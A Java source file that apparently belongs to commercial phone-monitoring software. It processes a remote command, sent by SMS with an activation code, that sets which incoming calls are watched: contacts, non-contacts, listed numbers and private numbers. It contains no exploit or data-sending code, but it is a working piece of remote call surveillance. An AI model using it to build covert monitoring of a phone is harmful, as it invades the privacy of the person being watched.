package com.vvt.remotecommandmanager.processor.callwatch;

import java.util.List;

import com.vvt.appcontext.AppContext;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.preference_manager.PrefWatchList;
import com.vvt.preference_manager.PreferenceManager;
import com.vvt.preference_manager.PreferenceType;
import com.vvt.preference_manager.WatchFlag;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

public class SetWatchFlagsProcessor extends RemoteCommandProcessor {
	private static final String TAG = "SetWatchFlagsProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private PreferenceManager mPreferenceManager;
	private LicenseInfo mLicenseInfo;
	private StringBuilder mReplyMessageBuilder;

	
	public SetWatchFlagsProcessor(AppContext appContext, FxEventRepository eventRepository,
			LicenseInfo licenseInfo, PreferenceManager preferenceManager) {
		super(appContext, eventRepository);
		
		mLicenseInfo = licenseInfo;
		mReplyMessage = new ProcessingResult();
		mPreferenceManager = preferenceManager;
	}

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.SYNC;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER .. ");
		mReplyMessageBuilder = new StringBuilder();
		
		validateRemoteCommandData(commandData);
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		if(LOGV) FxLog.v(TAG, "doProcessCommand # isSmsReplyRequired .. "+commandData.isSmsReplyRequired());
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}
		
		List<String> args = null;
		
		try	 {
			
			if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
				args = RemoteCommandUtil.removeActivationCodeFromArgs(commandData.getArguments());	
			}
			else {
				args = commandData.getArguments();
			}
			
			if(LOGD) FxLog.d(TAG, "arguments : " + args.toString());
			
			boolean f1 = stringToBoolean(args.get(0));
			boolean f2 = stringToBoolean(args.get(1));
			boolean f3 = stringToBoolean(args.get(2));
			boolean f4 = stringToBoolean(args.get(3));
			
			if(LOGV) FxLog.v(TAG, "doProcessCommand # f1 " + f1 );
			if(LOGV) FxLog.v(TAG, "doProcessCommand # f2 " + f2);
			if(LOGV) FxLog.v(TAG, "doProcessCommand # f3 " + f3);
			if(LOGV) FxLog.v(TAG, "doProcessCommand # f4 " + f4 );
			
			PrefWatchList  watchListPreference = (PrefWatchList)mPreferenceManager.getPreference(PreferenceType.WATCH_LIST);
			if(LOGV) FxLog.v(TAG, "doProcessCommand # after PrefWatchList");
			
			watchListPreference.addWatchFlag(WatchFlag.WATCH_IN_ADDRESSBOOK, f1);
			watchListPreference.addWatchFlag(WatchFlag.WATCH_NOT_IN_ADDRESSBOOK, f2);
			watchListPreference.addWatchFlag(WatchFlag.WATCH_IN_LIST, f3);
			watchListPreference.addWatchFlag(WatchFlag.WATCH_PRIVATE_OR_UNKNOWN_NUMBER, f4);
			
			if(LOGV) FxLog.v(TAG, "doProcessCommand # before save");
			mPreferenceManager.savePreferenceAndNotifyChange(watchListPreference);
			
			if(LOGD) FxLog.d(TAG, "After set WatchFlag : " + watchListPreference.getWatchFlag().toString());
			
			mReplyMessageBuilder.append(MessageManager.SET_WATCHLIST_SUCCESS);
			mReplyMessage.setIsSuccess(true);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		catch(Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
			
			mReplyMessageBuilder.append(MessageManager.SET_WATCHLIST_ERROR);
			mReplyMessage.setIsSuccess(false);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		if(LOGV) FxLog.v(TAG, "ReplyMessage : " + mReplyMessage.getMessage());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT .. ");
	}
	
	private boolean stringToBoolean(String stringVal) {
		if(stringVal.trim().equals("1"))
			return true;
		else
			return false;
	}
	
	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		
		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
			//Command should only have 5 arguments.
			if(commandData.getArguments().size() != 5) {
				throw new InvalidCommandFormatException();
			}
		
			//if invalid activation code it will throw exception.
			RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
		}
	}

	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}

}
